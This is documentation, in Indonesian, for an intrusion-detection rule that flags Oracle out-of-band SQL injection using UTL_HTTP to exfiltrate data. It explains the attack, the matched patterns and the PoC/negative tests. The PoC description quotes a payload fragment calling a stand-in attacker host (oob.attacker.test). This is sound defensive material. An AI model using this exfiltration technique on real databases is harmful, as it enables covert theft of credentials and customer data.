# SID 9100006 — Oracle out-of-band SQL injection (UTL_HTTP exfil)

**Rule:** `rules/plaintext/sqli.rules` · **Confidence:** high · **OWASP:** A03 Injection · **Severity:** Critical

## Serangan apa ini?
SQL injection di mana database-nya Oracle. Daripada nunggu hasil query muncul di
halaman, penyerang nyuruh Oracle sendiri yang "menelepon keluar" ke server
penyerang lewat package `UTL_HTTP.request(...)` — sambil membawa data hasil query
(misal username/password hash) di dalam URL. Teknik ini dipakai kalau hasil query
nggak kelihatan langsung di response (blind / out-of-band).

## Kalau kena, dampaknya?
Penyerang bisa **mencuri isi database diam-diam** (kredensial, data pelanggan)
walaupun aplikasi nggak pernah menampilkan hasilnya — karena datanya keluar lewat
koneksi DNS/HTTP dari server DB langsung ke infrastruktur penyerang. Susah
ke-detect oleh logging aplikasi biasa.

## Apa yang rule ini deteksi?
Pemanggilan `UTL_HTTP.request(` / `UTL_HTTP.set_*` / `HTTPURITYPE(` di dalam URL.
Aplikasi normal tidak pernah mengirim pemanggilan package jaringan Oracle —
jadi sinyal ini deterministik (high confidence, tanpa threshold).

## PoC vs Negative
- `poc.sh` → request berisi `UTL_HTTP.request('http://oob.attacker.test/'...)` → **harus** memicu SID 9100006.
- `negative.sh` → dokumentasi yang cuma menyebut kata `UTL_HTTP` → kena fast_pattern lalu **ditolak pcre** → TIDAK alert.

## Cara jalanin
```
scripts/rulectl check 9100006
```
Type: single-event.
